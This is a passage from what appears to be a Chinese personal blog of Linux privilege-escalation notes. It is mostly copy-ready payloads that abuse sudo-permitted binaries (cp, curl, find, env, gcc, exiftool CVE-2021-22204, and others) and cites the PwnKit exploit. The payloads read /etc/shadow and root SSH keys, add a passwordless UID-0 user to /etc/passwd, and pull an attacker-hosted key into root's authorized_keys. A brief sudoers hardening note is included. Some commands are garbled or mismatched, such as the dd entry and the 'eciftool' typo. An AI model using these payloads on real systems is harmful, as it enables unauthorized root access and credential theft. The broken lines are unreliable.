+<h4 id="漏洞利用-Exploitation-5"><a href="#漏洞利用-Exploitation-5" class="headerlink" title="漏洞利用 (Exploitation)"></a>漏洞利用 (Exploitation)</h4><p>这里主要有两种利用思路：<strong>任意文件读取</strong> 和 <strong>任意文件覆盖（直接提权）</strong>。</p>
+<p><strong>利用方式一：任意文件读取 (Data Exfiltration)</strong> 将只有 Root 能看的文件，复制到普通用户有权限访问的目录（如 <code>/tmp</code>），并顺手改掉权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将密码本复制到 /tmp 目录</span><br><span class="line">sudo cp /etc/shadow /tmp/shadow</span><br><span class="line"># 此时 /tmp/shadow 的属主仍然是 root，我们需要赋予它可读权限</span><br><span class="line">sudo chmod 777 /tmp/shadow  # (前提是你也有 chmod 的 sudo 权限，如果没有，可以结合其他方式，或者看方式二)</span><br></pre></td></tr></table></figure>
+<p>(注意：更直接的读文件方法是利用 cp 的标准输出特性，见 GTFOBins 高级用法，但覆盖法更通用)</p>
+<p><strong>利用方式二：恶意文件覆盖 (Malicious Overwrite) - 最常用且致命</strong> 核心思路是伪造一个 <code>/etc/passwd</code> 文件，在其中强行塞入一个拥有 Root 权限（UID=0）的新用户，然后覆盖掉系统的原文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1. 先把系统正常的 passwd 文件拷贝一份到临时目录作为基础</span><br><span class="line">cp /etc/passwd /tmp/passwd</span><br><span class="line"></span><br><span class="line"># 2. 在临时文件中追加一个无密码（或已知密码）的 root 权限用户</span><br><span class="line"># 这里以追加一个名为 hacker，无密码，UID 和 GID 均为 0 的用户为例</span><br><span class="line">echo &quot;hacker::0:0:root:/root:/bin/bash&quot; &gt;&gt; /tmp/passwd</span><br><span class="line"></span><br><span class="line"># 3. 致命一击：使用 sudo cp 将带有后门的临时文件，覆盖掉系统的真实文件</span><br><span class="line">sudo cp /tmp/passwd /etc/passwd</span><br><span class="line"></span><br><span class="line"># 4. 此时系统已经认领了新用户，直接切换即可拿到 Root 权限</span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞原理-Root-Cause-5"><a href="#漏洞原理-Root-Cause-5" class="headerlink" title="漏洞原理 (Root Cause)"></a>漏洞原理 (Root Cause)</h4><ol>
+<li><strong>无视系统安全边界（DAC 绕过）：</strong> Linux 依赖于文件权限控制（读、写、执行）来保护系统。<code>/etc/passwd</code> 等关键文件默认只允许 Root 写入。但是，当你执行 <code>sudo cp</code> 时，<code>cp</code> 进程获得了 Root 权限，它在进行复制和覆盖操作时，Linux 内核会对其一路绿灯，完全无视原本的权限拦截。</li>
+<li><strong>信任机制被滥用：</strong> 系统的身份验证机制（如 <code>login</code> 或 <code>su</code>）是绝对信任 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件的内容的。只要攻击者利用 <code>cp</code> 成功篡改了这些文件的内容，系统就会把攻击者写入的假账号当成真神仙供奉起来。</li>
+</ol>
+<h4 id="修复方案与防范-5"><a href="#修复方案与防范-5" class="headerlink" title="修复方案与防范"></a>修复方案与防范</h4><ul>
+<li><strong>绝对的权限红线：</strong> <strong>永远不要</strong>赋予任何能够进行文件复制、移动或重命名操作的命令（如 <code>cp</code>, <code>mv</code>, <code>dd</code>, <code>rsync</code>）以 <code>sudo</code> 权限。这些命令相当于给了用户直接修改系统 DNA 的能力。</li>
+<li><strong>业务场景替代方案：</strong> 如果业务场景（比如某个自动化运维系统的低权限账号）确实需要把文件从 A 复制到受保护的 B 目录，<strong>必须写一个 Bash 脚本</strong>，在脚本中将源路径和目标路径<strong>全部写死</strong>，然后只允许通过 <code>sudo</code> 运行该脚本。<ul>
+<li><strong>错误做法：</strong> <code>user ALL=(root) NOPASSWD: /bin/cp</code></li>
+<li><strong>正确做法：</strong> 编写 <code>/usr/local/bin/sync_web_code.sh</code> (内容为 <code>cp -r /home/user/code/* /var/www/html/</code>)，然后配置 <code>user ALL=(root) NOPASSWD: /usr/local/bin/sync_web_code.sh</code>这是一个非常危险且破坏性极强的提权点。<code>cp</code>（copy）命令本身非常简单，但当它被赋予了 <code>sudo</code> 权限后，就变成了一把可以随意篡改系统底层的“万能钥匙”。</li>
+</ul>
+</li>
+</ul>
+<p>与之前 <code>base64</code> 只能“读”不同，<code>cp</code> 不仅能“读”，还能“写（覆盖）”。你可以直接将以下内容补充到你的笔记中：</p>
+<hr>
+<h3 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a><code>sudo cpulimit</code></h3><p>利用 <code>cpulimit</code> 的命令行参数，指定启动 <code>/bin/sh</code>，并设置一个任意的 CPU 限制值（例如 100%）。</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cpulimit -l 100 -f -- /bin/sh</span><br></pre></td></tr></table></figure>
+<p><strong>参数解释：</strong></p>
+<ul>
+<li><code>-l 100</code>：限制目标进程最高使用 100% 的 CPU（这里只是个幌子，填多少无所谓）。</li>
+<li><code>-f</code>：让程序在前台运行（Foreground），这对于获取交互式 Shell 至关重要。</li>
+<li><code>--</code>：这是一个标准的分隔符，告诉 <code>cpulimit</code> 后面的内容不是你自己的参数了，而是我要你执行的命令。</li>
+</ul>
+<p>执行后，你将直接获得一个 Root 权限的终端提示符。</p>
+<h3 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a><code>sudo curl</code></h3><p><code>curl</code> 的提权利用主要分为“读”和“写”两个方向。</p>
+<p><strong>利用方式一：任意文件读取 (Arbitrary File Read)</strong> 利用 <code>curl</code> 内置的 <code>file://</code> 协议，直接读取本地硬盘上的受保护文件，效果类似于之前的 <code>base64</code> 或 <code>apache2</code>。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 读取并输出 root 用户的密码 Hash</span><br><span class="line">sudo curl file:///etc/shadow</span><br><span class="line"></span><br><span class="line"># 读取 root 用户的 SSH 私钥（如果存在）</span><br><span class="line">sudo curl file:///root/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p>
+<p><strong>利用方式二：恶意文件覆盖 (Malicious Overwrite) - 破坏性极强</strong> 这和 <code>sudo cp</code> 的思路类似，但不需要目标机器上有现成的恶意文件。攻击者可以在自己的攻击机（比如你的 Kali）上快速起一个 HTTP 服务，托管一个伪造的 <code>/etc/passwd</code> 文件或 SSH 公钥，然后让目标机器主动下载并覆盖系统原文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1. 攻击者在本地生成一对 SSH 密钥，并将公钥 (id_rsa.pub) 挂载到简易 HTTP 服务上 (如 python3 -m http.server 80)</span><br><span class="line"></span><br><span class="line"># 2. 在目标机器上，利用 sudo curl 将公钥下载并强行写入 root 的免密登录授权文件</span><br><span class="line">sudo curl http://&lt;攻击者IP&gt;/id_rsa.pub -o /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"># 3. 攻击者直接在自己机器上通过 SSH 免密登录目标机器的 root 账户</span><br><span class="line">ssh root@&lt;目标机器IP&gt;</span><br></pre></td></tr></table></figure>
+<p>(同理，也可以像 <code>cp</code> 那样去覆盖 <code>/etc/passwd</code> 或 <code>/etc/sudoers</code>)</p>
+<h3 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a><code>sudo date</code></h3><p>敏感信息读取<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -f /etc/shadow</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-dd"><a href="#sudo-dd" class="headerlink" title="sudo dd"></a><code>sudo dd</code></h3><p>利用方式：恶意文件覆盖<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://&lt;攻击者IP&gt;/id_rsa.pub -o /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a><code>sudo dstat</code></h3><p>dstat会导入插件使用，其实我们可以注入恶意插件，比如<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import os;os.execv(&quot;/bin/bash&quot;,[&quot;bash&quot;])&gt;dstat_eyi.py</span><br><span class="line">cp dstat_eyi.py /usr/share/dstat</span><br><span class="line">sudo dstat --eyi</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a><code>sudo ed</code></h3><p>这是一个linux编辑器，进入后输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a><code>sudo env</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo env /bin/bash</span><br></pre></td></tr></table></figure>
+<h3 id="sudo-exiftool"><a href="#sudo-exiftool" class="headerlink" title="sudo exiftool"></a><code>sudo exiftool</code></h3><h4 id="CVE-2021-22204"><a href="#CVE-2021-22204" class="headerlink" title="CVE-2021-22204"></a><code>CVE-2021-22204</code></h4><p>版本要求：7.44-11.23</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;(metadata &quot;</span>\c<span class="variable">$&#123;systemctl(&#x27;/bin/bash&#x27;)&#125;</span>;<span class="string">&quot;)&quot;</span>&gt;payload</span><br></pre></td></tr></table></figure>
+<p>使用bzz压缩</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bzz payload payload.bzz</span><br></pre></td></tr></table></figure>
+<p>使用djvumake生成利用文件<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">djvumake exploit.djvu INFO=&#x27;1,1&#x27; BGjp=/dev/null ANTz=payload.bzz</span><br></pre></td></tr></table></figure></p>
+<p>提权<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo eciftool exploit.djvu</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a><code>sudo expect</code></h3><p>自动化交互工具<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo expect -c &quot;spawn /bin/bash;interact&quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a><code>sudo fail2ban</code></h3><p>查找<code>fail2ban</code>的配置文件夹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc -wirteable -type d 2&gt;dev/null</span><br></pre></td></tr></table></figure><br>到达配置文件夹后需要更改<code>action.d</code>文件夹的配置文件<code>iptables-multiport.conf</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv iptables-multiport.conf iptables-multiport.conf.bak</span><br><span class="line">cp iptables-multiport.conf.bak iptables-multiport.conf</span><br></pre></td></tr></table></figure><br>更改actionban后就可以了</p>
+<h3 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a><code>sudo find</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/bash \; -quit</span><br></pre></td></tr></table></figure>
+<h3 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a><code>sudo flock</code></h3><p>管理文件锁定的程序<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo flock -u / /bin/bash</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a><code>sudo ftp</code></h3><p>启动交互式命令后输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a><code>sudo gcc</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -wrapper /bin/bash,-s .</span><br></pre></td></tr></table></figure>
+<h3 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a><code>sudo gdb</code></h3><h2 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h2><p>PolicyKit（ <code>polkit</code> ）是 Linux 操作系统上的一个授权服务，允许用户软件和系统组件在用户软件获得授权的情况下相互通信。为了检查用户软件是否被授权执行此操作，会询问 <code>polkit</code> 。可以设置每个用户和应用程序默认如何授予权限。例如，对于每个用户，可以设置操作是否应被普遍允许或禁止，或者是否需要以管理员身份或作为具有一次性、进程限制、会话限制或无限有效期的独立用户进行授权。对于单个用户和组，可以单独分配授权。</p>
+<p>Polkit 与两组文件协同工作。</p>
+<ol>
+<li>actions/policies (<code>/usr/share/polkit-1/actions</code>)  </li>
+<li>rules (<code>/usr/share/polkit-1/rules.d</code>)  </li>
+</ol>
+<p>Polkit 还具有 <code>local authority</code> 规则，可用于为用户和组设置或移除额外权限。自定义规则可以放置在 <code>/etc/polkit-1/localauthority/50-local.d</code> 目录中，文件扩展名为 <code>.pkla</code> 。</p>
+<p>PolKit 还附带三个附加程序：</p>
+<ul>
+<li><code>pkexec</code> - 以另一个用户或以 root 权限运行程序</li>
+<li><code>pkaction</code> - 可用于显示操作</li>
+<li><code>pkcheck</code> - 可用于检查进程是否被授权执行特定操作</li>
+</ul>
+<p>对我们来说，在这种情况下，最有趣的工具是 <code>pkexec</code> ，因为它执行与 <code>sudo</code> 相同的任务，并且可以以另一个用户或 root 的权限运行程序。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkexec -u &lt;user&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a><code>CVE-2021-4034</code></h3><p>在 <code>pkexec</code> 工具中，发现了一个内存损坏漏洞，标识符为 CVE-2021-4034，也被称为 Pwnkit，并会导致权限提升。这个漏洞也被隐藏了十多年，没有人能精确地说出它是什么时候被发现和利用的。最终，在 2021 年 11 月，这个漏洞被公开，并在两个月后被修复。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/arthepsy/CVE-2021-4034.git</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.xchstudy.org">chen7chen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.xchstudy.org/2026/05/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/07%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/2%20%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%B8%8E%E5%90%8E%E9%97%A8/linux%E6%8F%90%E6%9D%83/2%20Linux%E6%8F%90%E6%9D%83/">http://blog.xchstudy.org/2026/05/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/07%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/2%20%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%B8%8E%E5%90%8E%E9%97%A8/linux%E6%8F%90%E6%9D%83/2%20Linux%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.xchstudy.org" target="_blank">小chen妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://pic.chenjichao.site/raw/8.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/05/11/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/07%20%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5/0%20%E5%90%8E%E6%B8%97%E9%80%8F%E5%89%8D%E6%93%8D%E4%BD%9C/" title="后渗透前操作"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/11.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">后渗透前操作</div></div></a></div><div class="next-post pull-right"><a href="/2026/05/09/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/03%20web%E5%AE%89%E5%85%A8/3%20%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/3%20mssql%E6%B3%A8%E5%85%A5/1%20mssql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8/" title="mssql注入利用"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/11.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">mssql注入利用</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/images.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">chen7chen</div><div class="author-info__description">个人心得，学习分享</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">224</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">162</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cjc0729"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cjc0729" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:chenjichao729@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #24292e;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><center> <b> 学习使用，师傅勿喷(#／。＼#)； <br><br> 功能、内容尚未完全，网站还会持续更新优化哦(*´∀`)~♥ <br><br> 电影网站需要认证才能进入哦，如有需要，请联系本人。 声明：本人搭建所有网站均无商业用途。 </b> </center></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%9B%E6%BB%A5"><span class="toc-number">1.</span> <span class="toc-text">通配符泛滥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">特殊权限提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90"><span class="toc-number">2.1.</span> <span class="toc-text">特殊权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setuid"><span class="toc-number">2.1.1.</span> <span class="toc-text">setuid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Set-Group-ID"><span class="toc-number">2.1.2.</span> <span class="toc-text">Set-Group-ID</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capabilities%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">Capabilities提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AECapabilities"><span class="toc-number">2.2.1.</span> <span class="toc-text">设置Capabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BECapabilities"><span class="toc-number">2.2.2.</span> <span class="toc-text">枚举Capabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#capabilities%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">capabilities可执行文件利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%9F%E8%83%BD"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">利用功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">gdb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#perl"><span class="toc-number">2.2.3.3.</span> <span class="toc-text">perl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php"><span class="toc-number">2.2.3.4.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python"><span class="toc-number">2.2.3.5.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ruby"><span class="toc-number">2.2.3.6.</span> <span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rvim-vim%E7%AD%89%E7%BC%96%E8%BE%91%E5%99%A8"><span class="toc-number">2.2.3.7.</span> <span class="toc-text">rvim&#x2F;vim等编辑器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tar"><span class="toc-number">2.2.3.8.</span> <span class="toc-text">tar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#openssl"><span class="toc-number">2.2.3.9.</span> <span class="toc-text">openssl</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cron%E6%BB%A5%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">Cron滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#incron%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.</span> <span class="toc-text">incron提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#incron-%E7%9A%84%E6%A0%B8%E5%BF%83%E7%BB%84%E6%88%90"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">incron 的核心组成</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">容器提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LXC%E6%A6%82%E8%BF%B0"><span class="toc-number">3.2.1.</span> <span class="toc-text">LXC概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LXD"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">LXD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">docker</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.1.2.1.</span> <span class="toc-text">docker共享目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Docker%E5%A5%97%E6%8E%A5%E5%AD%97"><span class="toc-number">3.2.1.2.2.</span> <span class="toc-text">Docker套接字</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#K8s"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">K8s</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Logrotate"><span class="toc-number">3.3.</span> <span class="toc-text">Logrotate</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">内核漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE"><span class="toc-number">4.1.</span> <span class="toc-text">CVE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dirty-Pipe"><span class="toc-number">4.1.1.</span> <span class="toc-text">Dirty Pipe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%BA%93"><span class="toc-number">4.2.</span> <span class="toc-text">共享库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.2.1.</span> <span class="toc-text">LD_PRELOAD 权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E5%8A%AB%E6%8C%81"><span class="toc-number">4.2.2.</span> <span class="toc-text">共享对象劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%BA%93%E5%8A%AB%E6%8C%81"><span class="toc-number">4.3.</span> <span class="toc-text">python库劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF"><span class="toc-number">4.3.1.</span> <span class="toc-text">写权限错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%93%E8%B7%AF%E5%BE%84"><span class="toc-number">4.3.2.</span> <span class="toc-text">库路径</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E6%9C%BA%E5%88%B6%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">授权机制提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sudo%E9%A3%8E%E6%9A%B4"><span class="toc-number">5.1.</span> <span class="toc-text">Sudo风暴</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2019-14287"><span class="toc-number">5.1.1.</span> <span class="toc-text">cve-2019-14287</span></a><ol class="toc-child"><li class="toc-item 